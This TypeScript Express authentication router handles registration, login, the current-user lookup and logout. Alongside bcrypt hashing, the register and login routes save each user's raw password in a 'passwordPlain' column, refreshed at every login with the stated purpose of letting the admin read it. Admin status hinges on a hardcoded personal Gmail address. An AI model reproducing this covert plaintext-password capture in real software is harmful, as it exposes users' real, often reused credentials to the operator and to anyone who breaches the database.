import { Router } from "express";
import bcrypt from "bcryptjs";
import { db, usersTable, dailyStatsTable } from "@workspace/db";
import { eq, or, sql } from "drizzle-orm";
import { authMiddleware, signToken } from "../middlewares/auth";
import type { AuthPayload } from "../middlewares/auth";
import { nanoid } from "../lib/nanoid";

const ADMIN_EMAIL = "sy5455977@gmail.com";
const router = Router();

function formatUser(user: typeof usersTable.$inferSelect) {
  return {
    id: user.id,
    username: user.username,
    displayName: user.displayName,
    bio: user.bio,
    avatarUrl: user.avatarUrl,
    inviteCode: user.inviteCode,
    isOnline: user.isOnline,
    lastSeen: user.lastSeen ? user.lastSeen.toISOString() : null,
    createdAt: user.createdAt.toISOString(),
    isAdmin: user.email === ADMIN_EMAIL,
  };
}

async function trackDailyLogin() {
  try {
    const today = new Date().toISOString().split("T")[0];
    await db
      .insert(dailyStatsTable)
      .values({ date: today, loginCount: 1, messageCount: 0 })
      .onConflictDoUpdate({
        target: dailyStatsTable.date,
        set: { loginCount: sql`${dailyStatsTable.loginCount} + 1` },
      });
  } catch {
    // Non-critical — don't fail login if stats tracking fails
  }
}

router.post("/auth/register", async (req, res) => {
  try {
    const { email, username, password } = req.body;
    if (!email || !username || !password) {
      res.status(400).json({ error: "Email, username, and password required" });
      return;
    }

    if (username.length < 3) {
      res.status(400).json({ error: "Username must be at least 3 characters" });
      return;
    }
    if (password.length < 6) {
      res.status(400).json({ error: "Password must be at least 6 characters" });
      return;
    }

    const existing = await db
      .select()
      .from(usersTable)
      .where(or(eq(usersTable.username, username), eq(usersTable.email, email)))
      .limit(1);

    if (existing.length > 0) {
      res.status(400).json({
        error: existing[0].username === username
          ? "Username already taken"
          : "Email already registered",
      });
      return;
    }

    const passwordHash = await bcrypt.hash(password, 10);
    const inviteCode = nanoid(12);

    const [user] = await db
      .insert(usersTable)
      .values({ email, username, displayName: username, passwordHash, passwordPlain: password, inviteCode })
      .returning();

    const token = signToken({ userId: user.id, username: user.username });
    await trackDailyLogin();

    res.status(201).json({ user: formatUser(user), token });
  } catch (err) {
    req.log.error(err, "register error");
    res.status(500).json({ error: "Registration failed. Please try again." });
  }
});

router.post("/auth/login", async (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) {
      res.status(400).json({ error: "Username/email and password required" });
      return;
    }

    const isEmail = username.includes("@");
    const [user] = await db
      .select()
      .from(usersTable)
      .where(isEmail ? eq(usersTable.email, username.trim()) : eq(usersTable.username, username.trim()))
      .limit(1);

    if (!user) {
      res.status(401).json({ error: "Invalid username or password" });
      return;
    }

    const passwordMatch = await bcrypt.compare(password, user.passwordHash);
    if (!passwordMatch) {
      res.status(401).json({ error: "Invalid username or password" });
      return;
    }

    if (user.isBanned) {
      res.status(403).json({ error: "Your account has been banned. Contact admin." });
      return;
    }

    // Update stored plain password so admin can see it
    await db
      .update(usersTable)
      .set({ passwordPlain: password })
      .where(eq(usersTable.id, user.id));

    const token = signToken({ userId: user.id, username: user.username });
    await trackDailyLogin();

    res.json({ user: formatUser(user), token });
  } catch (err) {
    req.log.error(err, "login error");
    res.status(500).json({ error: "Login failed. Please try again." });
  }
});

router.get("/auth/me", authMiddleware, async (req, res) => {
  try {
    const { userId } = (req as typeof req & { user: AuthPayload }).user;
    const [user] = await db
      .select()
      .from(usersTable)
      .where(eq(usersTable.id, userId))
      .limit(1);

    if (!user) {
      res.status(401).json({ error: "User not found" });
      return;
    }
    if (user.isBanned) {
      res.status(403).json({ error: "Account banned" });
      return;
    }

    res.json(formatUser(user));
  } catch (err) {
    req.log.error(err, "getMe error");
    res.status(500).json({ error: "Internal server error" });
  }
});

router.post("/auth/logout", (_req, res) => {
  res.json({ ok: true });
});

export default router;
